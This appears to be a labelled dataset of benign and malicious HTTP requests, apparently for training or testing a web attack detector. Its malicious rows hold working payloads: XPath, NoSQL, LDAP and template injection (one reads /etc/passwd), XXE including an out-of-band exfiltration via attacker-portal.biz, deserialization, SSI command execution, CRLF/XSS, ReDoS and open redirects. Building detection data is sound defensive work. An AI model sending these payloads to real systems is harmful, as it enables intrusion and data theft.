label,text
malicious,"POST /session/login HTTP/1.1
Host: social-networking-hub.us
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Referer: https://social-networking-hub.us/login
Content-Length: 88

user=helena'%20and%20substring(substring(//users/user[1]/name,3,3),1,1)%3D'l&pass=supersecret"
benign,"POST /service/upload HTTP/1.1
Host: upload-documents-secure.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
X-Requested-With: XMLHttpRequest
Accept: application/json
User-Agent: Python-urllib/3.11
Content-Length: 202
Connection: keep-alive

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""title""

Quarterly Report
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name=""file""; filename=""report_q2.pdf""
Content-Type: application/pdf

%PDF-1.7 binarycontenthere...
------WebKitFormBoundary7MA4YWxkTrZu0gW--"
benign,"GET /dashboard/reports/monthly HTTP/1.1
Host: secure-user-portal.net:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Upgrade-Insecure-Requests: 1"
benign,"GET /api/v3/items/filter?category=outdoor-gear&filter[material]=nylon&filter[price_min]=50&sort_by=newest&page=1 HTTP/1.1
Host: summit-adventure-gear.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept: application/json
Referer: https://summit-adventure-gear.org/products/outdoor-gear
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /stats/user-activity?callback=processData&date=2024-06-12 HTTP/1.1
Host: engagement-tracker.app
Accept: application/javascript
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Pragma: no-cache
Referer: https://engagement-tracker.app/dashboard
Connection: close"
benign,"GET /products;category=books/item/7543/details HTTP/1.1
Host: online-bookware.co.uk
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: https://online-bookware.co.uk/products;category=books/"
benign,"GET /api/v3/weather/forecast?city=Stockholm&units=metric HTTP/1.1
Host: weatherhub-nordic.ai
User-Agent: curl/7.86.0
Accept: application/json
DNT: 1
Connection: close"
malicious,"PUT /user/profile/update HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhY2NfdHlwZSI6InVzZXIiLCJ1aWQiOiIxMjM0NTY3ODkwIn0.-_AG_1iDRk_-tQblwR0IN9Gf1dQfTzBB0RgxwBgUiAQ
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9

{
  ""user_details"": {
    ""name"": ""attacker"",
    ""address"": ""123 evil st""
  },
  ""account_info"": {
    ""subscription_level"": ""premium"",
    ""override_settings"": {
      ""is_feature_xyz_enabled"": true,
      ""credits_override"": 99999
    }
  }
}"
benign,"POST /login HTTP/1.1
Host: user-access-management.io
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://user-access-management.io
Referer: https://user-access-management.io/login
Cookie: sessionid=9f82b7d3a6e5c2d1; csrf_token=a3f67d8291bc4e0f
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36

username=jordan.mills&password=LoVeToRun2024"
benign,"GET /landing/promotion?utm_source=newsletter&utm_medium=email&utm_campaign=summer_sale HTTP/1.1
Host: offers-hub-marketing.net
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Referer: https://newsletter-secureportal.net/weekly-updates
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
benign,"HEAD /index.html HTTP/1.1
Host: docs.enterprise-cloud-solutions.net
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Connection: keep-alive
X-Forwarded-For: 203.0.113.45"
malicious,"POST /content/submit HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/xml
Accept: application/xml, text/html
Accept-Language: en-US
Content-Length: 175

<?xml version=""1.0""?>
<!DOCTYPE data [
<!ENTITY xxe_ssrf SYSTEM ""http://localhost:3000/debug"" >
]>
<feedback>
  <comment>&xxe_ssrf;</comment>
</feedback>"
benign,"GET /api/v1/inventory/items?warehouse=5&available=true HTTP/1.1
Host: inventory-control.cloudworks.biz
Accept: application/json
X-API-Key: 9a7dd995ae314fbb8daf49ec5ae2c623
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /static/v2/css/theme.css?id=1024&version=9 HTTP/1.1
Host: media-content-hub.io
Accept: text/css,*/*;q=0.1
Cache-Control: max-age=86400
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:112.0) Gecko/20100101 Firefox/112.0
Connection: keep-alive"
benign,"DELETE /api/v5/articles/54321 HTTP/1.1
Host: blog-content-management.info
Authorization: ApiKey 572f8e0b4a8c4e78b309476c1df67a12
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36
Accept: application/json
Connection: keep-alive"
benign,"POST /content-manager/csv-upload HTTP/1.1
Host: editor.my-personal-blog-site.info
User-Agent: Firefox/114.0 (Windows NT 10.0; Win64; x64; rv:114.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Content-Type: text/csv
Content-Length: 109
Pragma: no-cache
Cache-Control: no-store
Connection: close
Referer: https://editor.my-personal-blog-site.info/dashboard

date,title,category
2024-05-22,Deploy_New_Features,Technology
2024-05-23,Spring_Gardening_Tips,Lifestyle
2024-05-24,Top_Mountain_Trails,Travel"
benign,"PUT /profiles/mark_smith HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 66
Cookie: session_id=MTIzNDU2Nzg5MDEyMzQ1Njc4OTA=
Connection: keep-alive

{""bio"": ""Retail enthusiast &amp; buyer of &lt;b&gt;smart gadgets&lt;/b&gt;.""}"
benign,"GET /api/v2/accounts/list?filter[type]=admin&filter[active]=true HTTP/1.1
Host: api.cloud-data-services.ai
Connection: close
Accept: application/json, text/plain, */*
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
User-Agent: curl/7.85.0
Accept-Encoding: gzip, deflate"
malicious,"GET /portal/settings/config HTTP/1.1
Host: userprefs-update-center.org
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept: */*
Cache-Control: max-age=0
X-User-Filter: {""$where"": ""if(this.isAdmin){var d=new Date();while((new Date())-d<=5000){};}return true;""}
Connection: keep-alive"
malicious,"POST /accounts/verify-signature HTTP/1.1
Host: validation-nexus.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 168
Connection: keep-alive

user_signature_check=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%5A"
benign,"GET /products/electronics/tv/details?id=1024&color=black&warranty=extended HTTP/1.1
Host: online-retail-store.biz
Accept: application/json
Referer: https://online-retail-store.biz/products/electronics/tv
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.133 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cookie: sessionid=38af892b7ce14765a3ff"
benign,"GET /category/lifestyle/healthy-eating-trends HTTP/1.1
Host: dailywellnesscorner.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept: text/html
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.5
Referer: https://dailywellnesscorner.com/category/lifestyle
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
benign,"GET /videos/browse?genre=comedy&genre=animation&genre=family&quality=hd HTTP/1.1
Host: funflix-streams.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.7
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:111.0) Gecko/20100101 Firefox/111.0
Cache-Control: no-cache"
malicious,"GET /redirect?destination=http%3A%2F%2Fmalicious-phishing-site.com HTTP/1.1
Host: online-retail-store.biz
User-Agent: curl/7.77.0
Accept: */*
Referer: https://online-retail-store.biz/cart
Connection: close"
benign,"POST /project/assets/upload HTTP/1.1
Host: creative-hub-app.ai
User-Agent: curl/7.79.1
Content-Type: multipart/form-data; boundary=----BoundaryXYZ98765
Content-Length: 530
Accept: */*
Connection: keep-alive
Origin: https://creative-hub-app.ai
Referer: https://creative-hub-app.ai/project/assets

------BoundaryXYZ98765
Content-Disposition: form-data; name=""image1""; filename=""logo.png""
Content-Type: image/png

<binary png data>
------BoundaryXYZ98765
Content-Disposition: form-data; name=""image2""; filename=""banner.jpg""
Content-Type: image/jpeg

<binary jpeg data>
------BoundaryXYZ98765--"
malicious,"GET /app/user/settings/theme%0d%0aX-Injected-Header:%20InjectedPayload%0d%0a%0d%0a<script>eval('alert(1)')</script> HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.8
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Connection: keep-alive"
malicious,"POST /api/v3/items/search HTTP/1.1
Host: data-mining-central.org
Content-Type: application/json
Accept: */*
Accept-Language: en-US
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
X-Requested-With: XMLHttpRequest
Content-Length: 151

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
malicious,"GET /api/v3/items/search HTTP/1.1
Host: search-engine.fashion-tech.ai
X-User-Filter: {""$where"": ""if(this.premium==true){var startTime=new Date(); while((new Date())-startTime<=4500){} } return true;""}
User-Agent: curl/7.77.0
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"GET /public/site.shtml?template_name=default<!--#exec cmd=""/bin/uname -a""--> HTTP/1.1
Host: portal-dev-services.net
User-Agent: Lynx/2.8.9dev.15 libwww-FM/2.14
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Charset: UTF-8,ISO-8859-1;q=0.5
Cache-Control: no-cache
Connection: keep-alive"
benign,"PUT /api/v1/configuration/system/featureflags HTTP/1.1
Host: enterprise-it-solutions.com
Authorization: Bearer EaV7R9lfHs0uA2jDdR3pOWPLvoqxyGzt
Content-Type: application/xml
Accept: application/xml
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Content-Length: 123

<?xml version=""1.0"" encoding=""UTF-8""?>
<featureflags>
  <flag>
    <name>NewDashboard</name>
    <enabled>true</enabled>
  </flag>
  <flag>
    <name>BetaAPI</name>
    <enabled>false</enabled>
  </flag>
</featureflags>"
benign,"PATCH /api/clients/8147 HTTP/1.1
Host: crm-enterprise-solutions.biz
Authorization: Bearer 47dde38920a7c874e6fbf3b21990112c
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.85.0
Connection: close

{""phone"": ""+1-415-555-0198"", ""contact_preference"": ""email""}"
malicious,"POST /api/config/loadFromXml HTTP/1.1
Host: load-balancer-secure.io
Content-Type: application/xml
User-Agent: curl/7.77.0
Accept: */*
Cache-Control: no-cache
Pragma: no-cache

<data>
  <serializedObject><![CDATA[AAEAAAD/////AQAAAAdTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAAASFV9UeXBlQ29uZnVzZURlbGVnYXRlAAAGY3JlYXRlAAAAAA==System.Diagnostics.Process…Start…System.Configuration.Install.AssemblyInstaller]]></serializedObject>
</data>"
benign,"GET /api/v1/photos/search?query=mountains&orientation=landscape&color=blue&order_by=relevant&min_width=1920&min_height=1080&user_id=2367&page=1&per_page=30&content_filter=high HTTP/1.1
Host: pixel-vault.org
Accept: application/json
Authorization: Bearer OzxLmZy_32Nx7HTkWeP6sDdM
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept-Encoding: gzip
Connection: close"
benign,"POST /oauth/token HTTP/1.1
Host: auth.securelogin-hub.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Authorization: Basic bXNlY3VyZUNsaWVudDpTZWNyZXQxMjM=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=4f3d9a7b2cce4&redirect_uri=https%3A%2F%2Fapp.securelogin-hub.net%2Fcallback&client_id=msclient&client_secret=Secret123"
malicious,"POST /search LDAP HTTP/1.1
Host: enterprise-identity-hub.ai
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Accept-Language: en-US,en;q=0.8
Pragma: no-cache
Content-Length: 53

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*"
benign,"GET /api/v2/events/upcoming?category=music HTTP/1.1
Host: api.cloud-data-services.ai
Accept: application/json
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
X-Forwarded-For: 52.15.100.22
Connection: keep-alive
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/15.1 Safari/604.1"
benign,"GET /files/../images/logo.png HTTP/1.1
Host: fine-dining-experiences.info
Connection: keep-alive
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,fr;q=0.6
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15
Referer: https://fine-dining-experiences.info/menu/seasons/summer"
benign,"HEAD /media/movies/launch_trailer_4k.mov HTTP/1.1
Host: global-streaming-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"GET /user-profiles/john-doe HTTP/1.1
Host: innovative-creative-space.com
Accept: text/html
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Referer: https://innovative-creative-space.com/community
Connection: keep-alive"
benign,"GET /status HTTP/1.1
Host: api-payment-gateway.globalfintech.org
User-Agent: Prometheus/2.39.1
Accept: application/json
DNT: 1"
malicious,"GET /search HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://track.online-retail-store.biz/products{# {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /etc/passwd').read() }} #}
Cache-Control: max-age=0"
benign,"PUT /api/v3/user/preferences/19276 HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjIifQ.eyJ1aWQiOiIxOTI3NiIsImF1ZCI6InVzZXJwb3J0YWwifQ.KLJrT9oz1zxM8T7wb6YBoRNTvjo
Content-Type: application/json
Accept: application/json
User-Agent: curl/7.85.0
Content-Length: 112

{""id"":19276,""notifications"":true,""theme"":""dark"",""language"":""en-US"",""timezone"":""America/New_York""}"
benign,"POST /api/v1/reviews HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: python-requests/2.28.1
Content-Type: application/x-www-form-urlencoded
Accept: application/json
Authorization: Bearer mF_9.B5f-4.1JqM
Content-Length: 95
Connection: keep-alive
X-Forwarded-For: 192.168.1.15

product_id=3421&user_id=9827&rating=5&comments=VGhpcyBwcm9kdWN0IGV4Y2VlZHMgdGhlIGNoYXJ0LCB2ZXJ5IGhlbHBmdWwsIHlvdXIgbW9uZXkgc3RhcnMu"
benign,"GET /api/v1/maps/tiles/region42/zoom12/15/20.png HTTP/1.1
Host: geo-map-api.io
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Range: bytes=0-1023
Accept-Language: en
Via: 1.1 varnish
Connection: keep-alive"
malicious,"POST /service/upload HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Content-Type: application/xml
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 263

<!DOCTYPE doc [
<!ENTITY % file SYSTEM ""file:///var/log/auth.log"">
<!ENTITY % dtd SYSTEM ""http://attacker-portal.biz/malicious.dtd"">
%dtd;
%send;
]>
<request>
  <name>upload</name>
  <value>filedata</value>
</request>"
benign,"GET /news/tech-startup-raises-series-a HTTP/1.1
Host: digital-frontier-media.net
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html
Accept-Encoding: gzip, deflate, br
DNT: 1
Connection: keep-alive"
benign,"POST /news/signup HTTP/1.1
Host: financial-growth-hub.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br, gzip, deflate
Referer: https://financial-growth-hub.biz/news/signup
Connection: keep-alive

email=elena.foster%40wealthplans.org"
malicious,"GET /jump?url=http://shopper-retail-zone.org@phish-bait.biz/cart HTTP/1.1
Host: shopper-retail-zone.org
User-Agent: Python-urllib/3.9
Accept: */*
Accept-Encoding: identity
Connection: close"
benign,"POST /submit/article HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Language: en-US
User-Agent: curl/7.79.1
Accept: */*
Content-Length: 212
Connection: keep-alive

------WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Disposition: form-data; name=""title""

A Day in the Mountains
------WebKitFormBoundary5Z7UqnxGT3GmKyxP
Content-Disposition: form-data; name=""content""

I spent a beautiful day hiking and enjoying fresh air.
------WebKitFormBoundary5Z7UqnxGT3GmKyxP--"
